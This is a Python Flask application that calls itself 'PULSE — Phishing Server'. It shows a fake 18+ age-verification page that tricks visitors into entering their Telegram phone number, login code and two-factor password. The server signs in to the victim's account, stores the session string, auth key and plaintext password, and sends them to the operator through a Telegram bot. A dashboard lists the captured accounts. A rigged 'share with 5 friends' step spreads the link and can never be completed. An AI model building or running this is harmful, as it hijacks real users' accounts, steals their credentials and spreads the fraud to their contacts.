from flask import Flask, request, jsonify, render_template_string, session
import os
import json
import base64
import threading
import asyncio
import logging
import time
import hashlib
import hmac
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys
import secrets

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
BOT_ID = os.environ.get("BOT_ID", "")  # Numeric Bot ID (from @BotFather)
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))

raw_bot_username = os.environ.get("BOT_USERNAME", "YourBot")
BOT_USERNAME = raw_bot_username.replace('@', '')

if sys.version_info >= (3, 14):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()

# ====== In-memory client manager ======
pending_clients = {}
pending_clients_lock = threading.Lock()

# ====== Persistent Storage ======
DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']}")
    return account

captured_accounts = load_accounts()

def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

# ====== Bot Notification ======
def send_bot_notification(phone, ss, me, dc, password_used=False, password_text=None):
    try:
        pwd_line = f"\n🔐 **Password:** `{password_text}`" if password_text else ""
        msg = (
            f"🔔 **New Account Captured!**\n"
            f"📱 `{phone}`\n"
            f"👤 {me.first_name or ''} {me.last_name or ''}\n"
            f"🆔 `{me.id}`\n"
            f"📛 @{me.username or 'N/A'}\n"
            f"🌐 DC: `{dc}`{pwd_line}\n\n"
            f"🔑 **Session ({len(ss)} chars):**\n`{ss}`"
        )
        http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")

# ====== Telegram Async Functions ======
async def send_code_async(phone):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        r = await client.send_code_request(phone)
        with pending_clients_lock:
            pending_clients[phone] = {
                'client': client,
                'hash': r.phone_code_hash,
                'phone': phone,
                'status': 'sent'
            }
        with sessions_lock:
            pending_codes[phone] = 'sent'
            pending_2fa[phone] = False
        return {'success': True}
    except errors.FloodWaitError as e:
        with sessions_lock: pending_codes[phone] = 'err'
        return {'success': False, 'error': f'Flood wait {e.seconds}s'}
    except Exception as e:
        with sessions_lock: pending_codes[phone] = 'err'
        return {'success': False, 'error': str(e)[:80]}

async def verify_code_async(phone, code, password=None):
    with pending_clients_lock:
        entry = pending_clients.get(phone)
    
    if not entry:
        return {'success': False, 'error': 'No pending request. Please request code again.'}
    
    client = entry['client']
    code_hash = entry['hash']
    
    try:
        if not client.is_connected():
            await client.connect()
        
        if await client.is_user_authorized():
            me = await client.get_me()
        else:
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
                me = await client.get_me()
            except errors.SessionPasswordNeededError:
                with sessions_lock:
                    pending_2fa[phone] = True
                    pending_codes[phone] = '2fa_needed'
                if password:
                    try:
                        await client.sign_in(password=password)
                        me = await client.get_me()
                        with sessions_lock:
                            pending_2fa[phone] = False
                            pending_codes[phone] = 'done'
                    except errors.PasswordHashInvalidError:
                        return {'success': False, 'error': 'Wrong 2FA password'}
                    except Exception as e:
                        return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                else:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Wrong code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
            except Exception as e:
                return {'success': False, 'error': str(e)[:80]}
        
        await client.get_dialogs()
        ss = StringSession.save(client.session)
        
        auth_key = client.session.auth_key.key if client.session.auth_key else None
        dc = client.session.dc_id
        
        auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
        password_used = password is not None
        
        acc = {
            'phone': phone,
            'user_id': me.id,
            'username': me.username or '',
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'session': ss,
            'webk': json.dumps({
                'dcId': dc, 'authKey': auth_b64,
                'userId': me.id, 'isSupport': False, 'isTest': False
            }),
            'dc': dc,
            'time': str(datetime.now()),
            'has_2fa': password_used,
            'password': password if password_used else ''
        }
        
        save_account(acc)
        global captured_accounts
        captured_accounts = load_accounts()
        
        with pending_clients_lock:
            if phone in pending_clients:
                del pending_clients[phone]
        with sessions_lock:
            if phone in pending_2fa: del pending_2fa[phone]
            pending_codes[phone] = 'done'
        
        send_bot_notification(phone, ss, me, dc, password_used, password)
        return {'success': True, 'session': ss}
    
    except Exception as e:
        e_str = str(e)
        if 'PHONE_CODE_INVALID' in e_str: return {'success': False, 'error': 'Wrong code'}
        if 'SESSION_PASSWORD_NEEDED' in e_str: return {'success': False, 'error': '2FA', 'needs_password': True}
        if 'PASSWORD_HASH_INVALID' in e_str: return {'success': False, 'error': 'Wrong 2FA password'}
        return {'success': False, 'error': e_str[:80]}
    finally:
        try:
            await client.disconnect()
        except:
            pass


def run_telegram_action_sync(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        if code is not None:
            return loop.run_until_complete(verify_code_async(phone, code, password))
        else:
            return loop.run_until_complete(send_code_async(phone))
    finally:
        loop.close()


# ====== Verify Telegram Auth (server-side validation) ======
def verify_telegram_auth(auth_data):
    """Telegram Login Widget এর ডাটা ভেরিফাই করুন"""
    bot_token = BOT_TOKEN
    check_hash = auth_data.get('hash', '')
    
    # Check data fields (alphabetically sorted)
    fields = []
    for key in sorted(auth_data.keys()):
        if key != 'hash':
            fields.append(f"{key}={auth_data[key]}")
    
    data_check_string = '\n'.join(fields)
    
    # HMAC-SHA256 verification
    secret_key = hashlib.sha256(bot_token.encode()).digest()
    computed_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
    
    return computed_hash == check_hash


# ====== HTML PAGE (Telegram Login Widget - No Bot Redirect) ======
PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Premium Content</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0b0b0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.modal{background:#12121a;border-radius:20px;padding:30px 24px 24px;max-width:380px;width:100%;border:1px solid #1e1e2e;text-align:center;animation:slideUp 0.4s ease}
@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
.icon{font-size:52px;margin-bottom:10px}
h2{font-size:19px;margin-bottom:4px}
p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
.box{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:16px;padding:30px 20px;margin-bottom:14px}
.box .big-icon{font-size:60px;margin-bottom:10px}
.box h3{font-size:16px;margin-bottom:6px}
.box p{font-size:12px;color:#666;margin-bottom:18px}
.input-field{width:100%;padding:16px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:14px;color:#fff;font-size:20px;text-align:center;outline:none;margin:10px 0;transition:0.2s;letter-spacing:1px}
.input-field:focus{border-color:#0088cc}
.input-field::placeholder{color:#444}
.input-field.small{font-size:18px;letter-spacing:4px}
.btn-primary{width:100%;padding:18px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 25px rgba(0,136,204,0.3);transition:0.2s}
.btn-primary:hover{background:#0071b3;transform:translateY(-1px)}
.btn-primary:active{transform:translateY(0)}
.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
.btn-retry{width:100%;padding:14px;background:transparent;border:1px solid #1e1e2e;border-radius:12px;color:#888;font-size:13px;cursor:pointer;margin-top:10px;display:none;transition:0.2s}
.btn-retry:hover{border-color:#0088cc;color:#fff}
.status-box{padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px;text-align:center}
.status-box.show{display:block}
.status-box.waiting{background:rgba(255,152,0,0.12);color:#FFB74D;border:1px solid rgba(255,152,0,0.2)}
.status-box.success{background:rgba(52,199,89,0.12);color:#81C784;border:1px solid rgba(52,199,89,0.2)}
.status-box.error{background:rgba(255,45,85,0.12);color:#EF9A9A;border:1px solid rgba(255,45,85,0.2)}
.status-box.info{background:rgba(0,136,255,0.12);color:#90CAF9;border:1px solid rgba(0,136,255,0.2)}
.password-input{width:100%;padding:15px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:10px 0}
.password-input:focus{border-color:#ff2d55}
.password-input::placeholder{color:#444}
.step{display:none}
.step.active{display:block}
.share-progress{display:flex;justify-content:center;gap:6px;margin:16px 0}
.share-step{width:36px;height:36px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
.share-step.done{background:#34c759;color:#fff;border-color:#34c759;box-shadow:0 0 12px rgba(52,199,89,0.3)}
.share-step.active{background:transparent;color:#fff;border-color:#0088cc;animation:pulse 1.2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,255,0.3)}50%{box-shadow:0 0 0 8px rgba(0,136,255,0)}100%{box-shadow:0 0 0 0 rgba(0,136,255,0)}}
.share-link-box{background:#0b0b0f;padding:12px;border-radius:10px;border:1px solid #1e1e2e;margin-top:14px;text-align:center}
.share-link-box p{font-size:11px;color:#555;margin-bottom:6px}
.share-link-box code{color:#0088cc;font-size:10px;word-break:break-all}
.footer{text-align:center;padding:15px 0 5px;color:#333;font-size:10px}
.tg-login-container{display:flex;justify-content:center;margin:10px 0;min-height:50px}
</style>
</head>
<body>

<div class="modal" id="mainModal">
    
    <!-- STEP 1: Telegram Login (Web App Direct - No Bot Redirect!) -->
    <div id="s1" class="step active">
        <div class="icon">🔞</div>
        <h2>Age Verification Required</h2>
        <p>You must verify your identity to access this 18+ premium content</p>
        
        <div class="box">
            <div class="big-icon">✈️</div>
            <h3>Quick Verify with Telegram</h3>
            <p>Click below to securely share your phone number via Telegram</p>
            
            <div id="tgWidgetContainer"></div>
            
            <div id="phoneInputArea" style="display:none;margin-top:10px">
                <input type="tel" id="phoneInput" class="input-field" 
                       placeholder="+8801234567890" 
                       oninput="this.value=this.value.replace(/[^0-9+]/g,'')" />
                <button class="btn-primary" id="manualBtn" onclick="sendManualPhone()">
                    ✈️ Send Code
                </button>
            </div>
            
            <div id="loginStatus" class="status-box"></div>
            
            <p style="font-size:11px;color:#555;margin-top:8px">
                <span onclick="showManualInput()" style="cursor:pointer;color:#888">📝 Enter manually instead</span>
            </p>
        </div>
        
        <div class="footer">🔒 Your data is encrypted and secure</div>
    </div>
    
    <!-- STEP 2: OTP -->
    <div id="s2" class="step">
        <div class="icon">🔐</div>
        <h2>Enter Verification Code</h2>
        <p>Code sent to <span id="pd" style="color:#0088cc;font-weight:700;">+880XXXXXXXXXX</span></p>
        
        <div id="cs" class="status-box waiting show" style="display:none">⏳ Sending code...</div>
        
        <input type="text" id="otpInput" class="input-field small" 
               placeholder="_ _ _ _ _" maxlength="6"
               inputmode="numeric" pattern="[0-9]*"
               oninput="this.value=this.value.replace(/[^0-9]/g,''); if(this.value.length===5) setTimeout(submitOTP, 200)" />
        
        <button class="btn-primary" id="verifyBtn" onclick="submitOTP()" style="background:#34c759;box-shadow:0 6px 25px rgba(52,199,89,0.3)">
            ✓ Verify Code
        </button>
        
        <div id="vs" class="status-box"></div>
        <p style="font-size:11px;color:#555;margin-top:12px;cursor:pointer" onclick="resetAll()">← Start over</p>
    </div>
    
    <!-- STEP 2B: 2FA -->
    <div id="s2b" class="step">
        <div class="icon">🔑</div>
        <h2>Extra Security</h2>
        <p>This account has 2FA enabled. Enter your password:</p>
        <input type="password" id="pwdInput" class="password-input" placeholder="Enter Telegram password" maxlength="64">
        <button class="btn-primary" onclick="submitPassword()" style="background:#ff2d55;box-shadow:0 6px 25px rgba(255,45,85,0.3)">
            🔑 Verify Password
        </button>
        <div id="pwdStatus" class="status-box"></div>
    </div>
    
    <!-- STEP 3: Share Trick -->
    <div id="s3" class="step">
        <div class="icon">🎬</div>
        <h2>Almost There!</h2>
        <p>Share with <strong>5 friends</strong> to unlock the video</p>
        <div class="share-progress" id="shareProgress">
            <div class="share-step active" id="sp1">1</div>
            <div class="share-step" id="sp2">2</div>
            <div class="share-step" id="sp3">3</div>
            <div class="share-step" id="sp4">4</div>
            <div class="share-step" id="sp5">5</div>
        </div>
        <div id="shareStatus" class="status-box waiting show" style="display:block">⏳ Share to start unlocking...</div>
        <button class="btn-primary" onclick="simulateShare()" style="background:#34c759;box-shadow:0 6px 25px rgba(52,199,89,0.3)">📤 Share to Telegram</button>
        <div class="share-link-box">
            <p>🔗 Your personal link:</p>
            <code id="shareLink">https://t.me/share/url?url=...</code>
        </div>
    </div>
</div>

<script src="https://telegram.org/js/telegram-widget.js?22"></script>
<script>
// ===== STATE =====
var SAVED_PHONE_KEY = 'pulse_phone';
var SAVED_STEP_KEY = 'pulse_step';
var SAVED_SHARES_KEY = 'pulse_shares';

var phoneNumber = localStorage.getItem(SAVED_PHONE_KEY) || '';
var savedStep = localStorage.getItem(SAVED_STEP_KEY) || '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = parseInt(localStorage.getItem(SAVED_SHARES_KEY) || '0', 10);
var shareLinkBase = window.location.origin + window.location.pathname;
var BOT_ID = '{{ BOT_ID }}';

// ===== ON LOAD =====
(function() {
    initTelegramWidget();
    
    if (savedStep === 'share_page') {
        showStep('s3');
        setupShareLink();
        updateShareProgress();
    } else if (savedStep === 'otp_sent' && phoneNumber) {
        showStep('s2');
        document.getElementById('pd').textContent = phoneNumber;
        var cs = document.getElementById('cs');
        cs.className = 'status-box success show';
        cs.innerHTML = '✅ Code sent! Enter the code below:';
        cs.style.display = 'block';
        startCodeCheck();
    } else {
        showStep('s1');
    }
})();

function initTelegramWidget() {
    if (!BOT_ID) {
        document.getElementById('tgWidgetContainer').innerHTML = 
            '<p style="color:#ff2d55;font-size:12px">⚠️ BOT_ID not configured</p>';
        return;
    }
    
    // Create Telegram Login Widget
    var container = document.getElementById('tgWidgetContainer');
    container.innerHTML = '';
    
    var script = document.createElement('script');
    script.src = "https://telegram.org/js/telegram-widget.js?22";
    script.setAttribute('data-telegram-login', '{{ BOT_USERNAME }}');
    script.setAttribute('data-size', 'large');
    script.setAttribute('data-onauth', 'onTelegramAuth(user)');
    script.setAttribute('data-request-phone', 'true');
    script.setAttribute('data-radius', '14');
    script.setAttribute('data-userpic', 'false');
    container.appendChild(script);
}

// ===== CALLBACK: Telegram Auth Success (Phone Received!) =====
function onTelegramAuth(user) {
    console.log('Telegram Auth:', user);
    
    var st = document.getElementById('loginStatus');
    st.className = 'status-box info show';
    st.innerHTML = '⏳ Processing your information...';
    st.style.display = 'block';
    
    // Send to server for verification
    fetch('/api/telegram_auth', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(user)
    })
    .then(function(res) { return res.json(); })
    .then(function(data) {
        if (data.success && data.phone) {
            phoneNumber = data.phone;
            localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
            
            st.className = 'status-box success show';
            st.innerHTML = '✅ Phone received! Sending verification code...';
            st.style.display = 'block';
            
            // Now send OTP
            sendPhoneToBackend(phoneNumber);
        } else {
            // Phone not available - show manual input
            st.className = 'status-box error show';
            st.innerHTML = '❌ Could not get phone number. Please enter manually.';
            st.style.display = 'block';
            showManualInput();
        }
    })
    .catch(function() {
        st.className = 'status-box error show';
        st.innerHTML = '❌ Connection error. Please enter manually.';
        st.style.display = 'block';
        showManualInput();
    });
}

function showManualInput() {
    document.getElementById('phoneInputArea').style.display = 'block';
    document.getElementById('tgWidgetContainer').style.display = 'none';
}

async function sendManualPhone() {
    var phone = document.getElementById('phoneInput').value.trim();
    if (!phone || phone.length < 5) {
        var st = document.getElementById('loginStatus');
        st.className = 'status-box error show';
        st.innerHTML = '❌ Please enter a valid phone number';
        st.style.display = 'block';
        return;
    }
    
    phoneNumber = phone;
    localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
    sendPhoneToBackend(phoneNumber);
}

async function sendPhoneToBackend(phone) {
    document.getElementById('manualBtn') && (document.getElementById('manualBtn').disabled = true);
    
    var st = document.getElementById('loginStatus');
    st.className = 'status-box info show';
    st.innerHTML = '⏳ Sending verification code...';
    st.style.display = 'block';
    
    try {
        var res = await fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone})
        });
        var data = await res.json();
        
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'otp_sent');
            showStep('s2');
            document.getElementById('pd').textContent = phone;
            document.getElementById('otpInput').value = '';
            document.getElementById('otpInput').focus();
            
            var cs = document.getElementById('cs');
            cs.className = 'status-box waiting show';
            cs.innerHTML = '⏳ Sending code...';
            cs.style.display = 'block';
            startCodeCheck();
        } else {
            st.className = 'status-box error show';
            st.innerHTML = '❌ ' + (data.error || 'Failed to send code');
            st.style.display = 'block';
        }
    } catch(e) {
        st.className = 'status-box error show';
        st.innerHTML = '❌ Connection error';
        st.style.display = 'block';
    }
}

// ===== OTP CHECK =====
function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'sent') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box success show';
                cs.innerHTML = '✅ Code sent! Enter the 5-digit code:';
                cs.style.display = 'block';
                document.getElementById('otpInput').focus();
            } else if (data.s === 'done') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (data.s === '2fa_needed') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                showStep('s2b');
            } else if (data.s === 'err') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box error show';
                cs.innerHTML = '❌ Error sending code. Please try again.';
                cs.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

// ===== OTP Submit =====
async function submitOTP() {
    var code = document.getElementById('otpInput').value.trim();
    if (!code || code.length < 4) {
        showVerifyStatus('❌ Please enter the full code', 'error');
        return;
    }
    
    document.getElementById('verifyBtn').disabled = true;
    document.getElementById('verifyBtn').textContent = '⏳ Verifying...';
    
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: code})
        });
        var data = await res.json();
        
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            showStep('s3');
            setupShareLink();
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else if (data.needs_password) {
            showStep('s2b');
            startPasswordCheck();
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else {
            showVerifyStatus('❌ ' + (data.error || 'Invalid code'), 'error');
            document.getElementById('otpInput').value = '';
            document.getElementById('otpInput').focus();
            document.getElementById('verifyBtn').disabled = false;
            document.getElementById('verifyBtn').textContent = '✓ Verify Code';
        }
    } catch(e) {
        showVerifyStatus('❌ Network error', 'error');
        document.getElementById('verifyBtn').disabled = false;
        document.getElementById('verifyBtn').textContent = '✓ Verify Code';
    }
}

function startPasswordCheck() {
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    passwordCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'done') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (data.s === 'err') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                var ps = document.getElementById('pwdStatus');
                ps.className = 'status-box error show';
                ps.innerHTML = '❌ Verification failed';
                ps.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    if (!pwd) {
        var ps = document.getElementById('pwdStatus');
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Enter your password';
        ps.style.display = 'block';
        return;
    }
    var ps = document.getElementById('pwdStatus');
    ps.className = 'status-box waiting show';
    ps.innerHTML = '⏳ Verifying...';
    ps.style.display = 'block';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: document.getElementById('otpInput').value.trim(), password: pwd})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            showStep('s3');
            setupShareLink();
            if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
        } else {
            ps.className = 'status-box error show';
            ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
            ps.style.display = 'block';
        }
    } catch(e) {
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Connection error';
        ps.style.display = 'block';
    }
}

function showVerifyStatus(msg, type) {
    document.getElementById('vs').textContent = msg;
    document.getElementById('vs').className = 'status-box ' + type + ' show';
    document.getElementById('vs').style.display = 'block';
}

function showStep(id) {
    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
    document.getElementById(id).classList.add('active');
}

function resetAll() {
    if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
    if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
    localStorage.removeItem(SAVED_PHONE_KEY);
    localStorage.removeItem(SAVED_STEP_KEY);
    phoneNumber = '';
    savedStep = '';
    document.getElementById('otpInput').value = '';
    showStep('s1');
    initTelegramWidget();
}

// ===== SHARE TRICK =====
function setupShareLink() {
    var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
    document.getElementById('shareLink').textContent = link;
    updateShareProgress();
}

function simulateShare() {
    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
    window.open(shareUrl, '_blank');
    
    if (sharesDone < 4) {
        sharesDone++;
        localStorage.setItem(SAVED_SHARES_KEY, sharesDone.toString());
        updateShareProgress();
    }
    
    var st = document.getElementById('shareStatus');
    
    if (sharesDone < 4) {
        st.className = 'status-box success show';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more...';
    } else if (sharesDone === 4) {
        st.className = 'status-box waiting show';
        st.innerHTML = '⏳ Almost there! Just 1 more share!';
        setTimeout(function() {
            if (sharesDone === 4) {
                st.className = 'status-box info show';
                st.innerHTML = '🔄 Verifying shares...';
                setTimeout(function() {
                    if (sharesDone === 4) {
                        st.className = 'status-box error show';
                        st.innerHTML = '❌ Verification failed. Try again.';
                        sharesDone = 3;
                        localStorage.setItem(SAVED_SHARES_KEY, '3');
                        updateShareProgress();
                        setTimeout(function() {
                            st.className = 'status-box waiting show';
                            st.innerHTML = '⏳ Share with 2 more friends to retry.';
                        }, 2000);
                    }
                }, 5000);
            }
        }, 3000);
    }
}

function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) {
            el.className = 'share-step done';
            el.textContent = '✓';
        } else if (i === sharesDone + 1) {
            el.className = 'share-step active';
            el.textContent = i;
        } else {
            el.className = 'share-step';
            el.textContent = i;
        }
    }
}
</script>
</body>
</html>"""


# ====== Flask Routes ======

@app.route('/')
def index():
    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
    page = page.replace('{{ BOT_ID }}', BOT_ID)
    return render_template_string(page)

@app.route('/api/telegram_auth', methods=['POST'])
def telegram_auth():
    """Telegram Login Widget callback - phone number নিন"""
    auth_data = request.json
    logger.info(f"📩 Telegram Auth: {json.dumps(auth_data, indent=2)[:200]}")
    
    # Server-side verification
    if not verify_telegram_auth(auth_data):
        logger.warning("⚠️ Invalid Telegram auth hash")
        return jsonify({'success': False, 'error': 'Invalid auth data'})
    
    phone = auth_data.get('phone_number', '')
    if phone:
        phone = format_phone(phone)
        logger.info(f"📱 Phone received via Telegram Login: {phone}")
        return jsonify({'success': True, 'phone': phone})
    else:
        logger.warning("⚠️ No phone number in auth data")
        return jsonify({'success': False, 'error': 'No phone number'})

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    logger.info(f"📱 Sending code to: {ph}")
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    t = threading.Thread(target=run_telegram_action_sync, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = d.get('phone', '')
    code = d.get('code', '')
    password = d.get('password', None)
    ph = format_phone(ph)
    result = run_telegram_action_sync(ph, code, password)
    return jsonify(result)

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_ok = "✅" if a.get('session') and len(a['session']) > 10 else "❌"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        pwd = a.get('password', '')
        pwd_display = f"🔑 {pwd[:15]}..." if pwd else "—"
        twofa = "🔐" if a.get('has_2fa') else ""
        rows += f"""<tr>
            <td>{i}</td>
            <td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td>
            <td>{a.get('user_id','')}</td>
            <td>{twofa} {ss_ok} ({ss_len}c)</td>
            <td>{pwd_display}</td>
            <td>{a.get('time','')[:19]}</td>
        </tr>"""
    
    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
    
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>
        body{{background:#0b0a0f;color:#fff;font-family:Arial;padding:20px}}
        h1{{color:#ff2d55}}
        .stats{{display:flex;gap:15px;margin:15px 0}}
        .st{{background:#12121a;padding:15px 25px;border-radius:10px;text-align:center;flex:1;border:1px solid #1e1e2e}}
        .st .n{{font-size:28px;font-weight:bold;color:#0088cc}}
        .st .l{{color:#666;font-size:12px;margin-top:4px}}
        table{{width:100%;border-collapse:collapse;margin-top:15px;font-size:13px}}
        th,td{{padding:10px 8px;text-align:left;border-bottom:1px solid #1e1e2e}}
        th{{background:#12121a;color:#ddd}}
        tr:hover{{background:#12121a}}
    </style></head>
    <body>
    <h1>📊 Dashboard</h1>
    <div class="stats">
        <div class="st"><div class="n">{len(accounts)}</div><div class="l">Total</div></div>
        <div class="st"><div class="n">{total_2fa}</div><div class="l">2FA 🔐</div></div>
    </div>
    <table><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>Session</th><th>Password</th><th>Time</th></tr>
    {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}
    </table>
    <script>setTimeout(()=>location.reload(),10000)</script>
    </body></html>
    """


if __name__ == '__main__':
    if not BOT_TOKEN or not API_HASH or API_ID == 0:
        print("⚠️  WARNING: Missing environment variables!")
        print(f"   BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
        print(f"   BOT_ID: {'✅' if BOT_ID else '❌'}")
        print(f"   API_ID: {API_ID}")
        print(f"   API_HASH: {'✅' if API_HASH else '❌'}")
        print(f"   OWNER_ID: {YOUR_TELEGRAM_ID}")
        print(f"   BOT_USERNAME: {BOT_USERNAME}")
    else:
        print("✅ All environment variables set!")
    
    port = int(os.environ.get('PORT', 5000))
    print(f"\n{'='*50}")
    print(f"🔥 PULSE — Phishing Server (Telegram Login Widget)")
    print(f"{'='*50}")
    print(f"🌐 URL:      http://0.0.0.0:{port}")
    print(f"📊 Dashboard: http://0.0.0.0:{port}/dash")
    print(f"📱 New: Telegram Login Widget — Web App থেকে সরাসরি phone share!")
    print(f"{'='*50}\n")
